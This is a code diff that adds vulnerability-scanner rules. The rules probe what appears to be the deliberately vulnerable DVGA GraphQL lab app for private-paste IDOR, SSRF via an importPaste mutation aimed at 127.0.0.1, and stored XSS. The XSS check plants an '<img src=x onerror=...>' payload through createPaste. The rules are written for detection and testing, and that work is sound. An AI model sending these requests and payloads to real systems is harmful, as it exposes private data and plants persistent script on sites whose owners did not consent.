@@ -40796,6 +40796,154 @@ const dvgaGraphqlSqliFilterRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const dvgaMyPastesIdorLiveOracle: Rule = async (ctx) => {
+  if (!isDvgaLiveHost(ctx)) return NEGATIVE;
+  const base = dvgaCanonicalOrigin(ctx);
+  const gqlUrl = new URL("/graphql", base).toString();
+  const doc = await fetchDoc(gqlUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      query: "{ pastes(public: false) { id title content owner { name } } }"
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"pastes"\s*:\s*\[/.test(doc.body)) return NEGATIVE;
+  const privateHits = [...doc.body.matchAll(/"id"\s*:\s*"(\d+)"[\s\S]{0,400}?"public"\s*:\s*false/g)];
+  const ownerHits = [...doc.body.matchAll(/"owner"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"/g)];
+  const titleHits = [...doc.body.matchAll(/"title"\s*:\s*"([^"]{2,80})"/g)];
+  if (ownerHits.length < 1 || titleHits.length < 1) return NEGATIVE;
+  const sampleTitle = titleHits[0]?.[1];
+  const sampleOwner = ownerHits[0]?.[1];
+  return {
+    fired: true,
+    confidence: privateHits.length >= 1 ? 0.93 : ownerHits.length >= 2 ? 0.92 : 0.9,
+    evidence: {
+      url: gqlUrl,
+      privatePasteCount: Math.max(privateHits.length, ownerHits.length),
+      sampleTitle,
+      sampleOwner,
+      snippet: doc.body.slice(0, 180).trim(),
+      note: "DVGA POST /graphql { pastes(public: false) } returns other users' private pastes without authentication — BOLA/IDOR oracle"
+    }
+  };
+};
+
+const dvgaMyPastesIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDvgaLiveHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/my_pastes\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await dvgaMyPastesIdorLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "DVGA /my_pastes route scan — unauthenticated pastes(public:false) query returns private paste gallery data — route-specific BOLA/IDOR oracle"
+    }
+  };
+};
+
+const dvgaImportPasteSsrfLiveOracle: Rule = async (ctx) => {
+  if (!isDvgaLiveHost(ctx)) return NEGATIVE;
+  const base = dvgaCanonicalOrigin(ctx);
+  const gqlUrl = new URL("/graphql", base).toString();
+  const doc = await fetchDoc(gqlUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      query:
+        "mutation ImportPaste($host: String!, $port: Int!, $path: String!, $scheme: String!) { importPaste(host: $host, port: $port, path: $path, scheme: $scheme) { result } }",
+      variables: { host: "127.0.0.1", port: 1, path: "/", scheme: "http" }
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 8000
+  });
+  if (doc.status < 200 || doc.status >= 500) return NEGATIVE;
+  if (!/"importPaste"\s*:/.test(doc.body)) return NEGATIVE;
+  if (/"errors"\s*:\s*\[/.test(doc.body) && !/"data"\s*:\s*\{/.test(doc.body)) return NEGATIVE;
+  const resultMatch = doc.body.match(/"importPaste"\s*:\s*\{[^}]*"result"\s*:\s*"([^"]*)"/);
+  return {
+    fired: true,
+    confidence: resultMatch ? 0.92 : 0.9,
+    evidence: {
+      url: gqlUrl,
+      snippet: doc.body.slice(0, 160).trim(),
+      note: "DVGA importPaste(host,port,path,scheme) mutation callable without auth — server-side request forgery oracle via paste import"
+    }
+  };
+};
+
+const dvgaImportPasteSsrfRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDvgaLiveHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/import_paste\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await dvgaImportPasteSsrfLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "DVGA /import_paste route scan — importPaste mutation fetches attacker-controlled host:port without auth — route-specific SSRF oracle"
+    }
+  };
+};
+
+const dvgaCreatePasteStoredXssLiveOracle: Rule = async (ctx) => {
+  if (!isDvgaLiveHost(ctx)) return NEGATIVE;
+  const base = dvgaCanonicalOrigin(ctx);
+  const gqlUrl = new URL("/graphql", base).toString();
+  const canary = `thugirXss${Date.now().toString(36)}`;
+  const xssPayload = `<img src=x onerror=${canary}>`;
+  const doc = await fetchDoc(gqlUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      query: `mutation { createPaste(title: "${canary}", content: "${xssPayload.replace(/"/g, '\\"')}", public: true) { paste { id title content } } }`
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"createPaste"\s*:/.test(doc.body)) return NEGATIVE;
+  if (!doc.body.includes(xssPayload) && !doc.body.includes(`onerror=${canary}`)) return NEGATIVE;
+  const idMatch = doc.body.match(/"id"\s*:\s*"(\d+)"/);
+  return {
+    fired: true,
+    confidence: idMatch ? 0.93 : 0.9,
+    evidence: {
+      url: gqlUrl,
+      canary,
+      pasteId: idMatch?.[1],
+      snippet: doc.body.match(new RegExp(`.{0,40}${canary}.{0,60}`))?.[0]?.slice(0, 140),
+      note: "DVGA createPaste mutation stores unsanitized HTML/script in paste content — stored XSS oracle"
+    }
+  };
+};
+
+const dvgaCreatePasteStoredXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDvgaLiveHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/create_paste\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await dvgaCreatePasteStoredXssLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "DVGA /create_paste route scan — createPaste accepts unsanitized HTML in content field — route-specific stored XSS oracle"
+    }
+  };
+};
+
 // --- Gin & Juice Shop catalog route oracles (ginandjuice.shop) ----------------------
 function isGinAndJuiceHost(ctx: RuleContext): boolean {
   return /ginandjuice\.shop/i.test(ctx.origin);
@@ -53311,6 +53459,12 @@ export const RULES: Record<string, Rule> = {
   dvgaGraphqlIntrospectionRouteLiveOracle,
   dvgaGraphqlSqliFilterLiveOracle,
   dvgaGraphqlSqliFilterRouteLiveOracle,
+  dvgaMyPastesIdorLiveOracle,
+  dvgaMyPastesIdorRouteLiveOracle,
+  dvgaImportPasteSsrfLiveOracle,
+  dvgaImportPasteSsrfRouteLiveOracle,
+  dvgaCreatePasteStoredXssLiveOracle,
+  dvgaCreatePasteStoredXssRouteLiveOracle,
   ginAndJuiceCatalogSearchXssLiveOracle,
   ginAndJuiceCatalogRouteLiveOracle,
   ginAndJuiceBlogPostOpenRedirectLiveOracle,
